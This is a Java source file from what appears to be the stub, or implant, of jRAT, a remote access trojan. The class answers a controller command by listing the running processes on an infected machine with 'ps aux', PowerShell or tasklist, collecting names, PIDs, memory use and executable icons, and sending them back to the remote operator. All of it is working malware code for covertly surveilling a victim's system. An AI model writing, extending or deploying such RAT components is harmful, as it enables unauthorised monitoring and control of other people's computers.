package se.jrat.stub.packets.incoming;

import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;

import javax.swing.ImageIcon;
import javax.swing.filechooser.FileSystemView;

import se.jrat.common.ProcessData;
import se.jrat.common.utils.DataUnits;
import se.jrat.stub.Connection;
import se.jrat.stub.packets.outgoing.Packet25Process;

import com.redpois0n.oslib.OperatingSystem;
import com.redpois0n.oslib.windows.WindowsOperatingSystem;
import com.redpois0n.oslib.windows.WindowsVersion;


public class Packet19ListProcesses extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		boolean icons = con.readBoolean();
		
		try {
			Process p = run();
			
			if (p != null) {
				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

				if (OperatingSystem.getOperatingSystem().getType() != OperatingSystem.WINDOWS) {
					reader.readLine();
				}
				
				String line;

				while ((line = reader.readLine()) != null) {		
					if (line.length() > 0) {
						con.addToSendQueue(new Packet25Process(parse(line)));
					}
				}
				reader.close();
			}
		} catch (Exception err) {
			err.printStackTrace();
		}
	}
	
	/**
	 * Executes and returns the process to read the data from
	 * @return
	 */
	public static final Process run() throws Exception {
		Process p;
				
		if (OperatingSystem.getOperatingSystem().isUnix()) {
			p = Runtime.getRuntime().exec("ps aux");
		} else {
			assert OperatingSystem.getOperatingSystem() instanceof WindowsOperatingSystem;
			
			WindowsOperatingSystem wos = (WindowsOperatingSystem) OperatingSystem.getOperatingSystem();
			WindowsVersion version = wos.getVersion();

			if (version == WindowsVersion.WINVISTA || version.isNewer(WindowsVersion.WINVISTA)) {
				p = Runtime.getRuntime().exec(new String[] { "powershell", "Get-Process * | Format-Table -Property name,id,privatememorysize64,path -AutoSize" });
			} else {
				p = Runtime.getRuntime().exec("tasklist.exe /fo csv /nh");
			}
		}
		
		return p;
	}
	
	/**
	 * Parses input data and gets only the wanted information
	 * @param line
	 * @return array to be sent back to controller
	 */
	public static final ProcessData parse(String line) {
		String[] data = new String[4];
		BufferedImage image = null;
		
		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
			WindowsOperatingSystem wos = (WindowsOperatingSystem) OperatingSystem.getOperatingSystem();
			WindowsVersion version = wos.getVersion();
			
			if (version == WindowsVersion.WINVISTA || version.isNewer(WindowsVersion.WINVISTA)) {
				line = line.replaceAll("( )+", " ");
				String[] sline = line.split(" ");

				data[0] = sline[0];
				data[1] = sline[1];
				
				try {
					data[2] = DataUnits.getAsString(Long.parseLong(sline[2]));
				} catch (NumberFormatException e1) {
					e1.printStackTrace();
				}

				if (sline.length >= 4) {
					String path = "";
					
					for (int i = 3; i < sline.length; i++) {
						path += sline[i] + " ";
					}

					try {
						image = (BufferedImage) ((ImageIcon) FileSystemView.getFileSystemView().getSystemIcon(new File(path))).getImage();
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			} else {
				line = line.replace("\"", "").replace("�", "");
				String[] sline = line.split(",");

				data[0] = sline[0]; // name
				data[1] = sline[1]; // pid
				data[2] = sline[2]; // type / user
				data[3] = sline[4]; // memory usage
				
				data[3] = DataUnits.getAsString(Long.parseLong(sline[3].split(" ")[0]) * 1000);
			}
		} else {
			line = line.trim().replaceAll("( )+", " ");
			String[] args = line.split(" ");

			data[0] = args[args.length - 1];
			data[1] = args[2];
			data[2] = args[0];
			data[3] = args[3];
		}

		for (int i = 0; i < data.length; i++) {
			if (data[i] == null) {
				data[i] = "";
			}
		}
		
		return new ProcessData(data, image);
	}

}
